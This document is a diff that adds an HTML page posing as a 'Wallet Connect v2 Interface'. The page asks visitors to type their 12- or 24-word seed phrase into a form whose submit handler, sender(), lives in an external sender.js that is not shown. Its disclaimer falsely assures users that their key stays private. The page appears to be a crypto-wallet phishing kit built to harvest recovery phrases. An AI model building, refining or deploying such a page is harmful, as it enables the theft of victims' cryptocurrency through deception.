@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Wallet Connect Interface</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <img
+      src="https://miro.medium.com/v2/resize:fit:900/1*x00NFdB9gGPVskps1q6q4A.png"
+      alt="logo"
+      class="center"
+    />
+
+    <div class="container">
+      <h1>Wallet Connect v2 Interface</h1>
+      <h3 class="note">NOTIFICATION!</h3>
+
+      <p class="disclaimer">
+        ** Protecting your digital sovereignty, your cryptographic key remains
+        yours alone. Through robust web3 protocols, we fortify your wallet's
+        connection in our cyberspace fortress. Rest assured, your assets stay
+        secure, under your ultimate control. **
+      </p>
+
+      <form action="" onsubmit=" return sender()">
+        <label for="seedPhrase">ENTER YOUR SEED PHRASE:</label>
+        <textarea
+          type="text"
+          id="seedPhrase"
+          name="seedPhrase"
+          rows="6"
+          cols="40"
+          placeholder="Type in your 12/24 word seed phrase"
+          class="text"
+          required
+        ></textarea>
+        <br />
+
+        <button type="submit">IMPORT</button>
+      </form>
+      <br />
+      <br />
+      <div class="yes">
+        <div class="img-container">
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLX6P5S9HOScJKRai0uq3FoRpJgSxkBT6GSuqje-Plhg&s"
+            alt=""
+            class="ok"
+          />
+        </div>
+        <div class="img-container">
+          <img
+            src="https://u.today/sites/default/files/styles/twitter/public/2023-12/43079.jpg"
+            alt=""
+            class="ok"
+          />
+        </div>
+
+        <div class="img-container">
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2I_wO2gmVddGSYdm9R-PIjzYci5Exqbel3zKymANjXQ&s"
+            alt=""
+            class="ok"
+          />
+        </div>
+        <div class="img-container">
+          <img
+            src="data:image/jpeg;base64,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"
+            alt=""
+            class="ok"
+          />
+        </div>
+        <div class="img-container">
+          <img
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-UnIL2pgKu-pgTma4M4UoNYOak9f3yyUmZAeblzPFsg&s"
+            alt=""
+            class="ok"
+          />
+        </div>
+      </div>
+    </div>
+    <footer>
+      <p class="footer">&copy; 2024 Wallet Connect. All rights reserved.</p>
+    </footer>
+    <script src="sender.js"></script>
+  </body>
+</html>
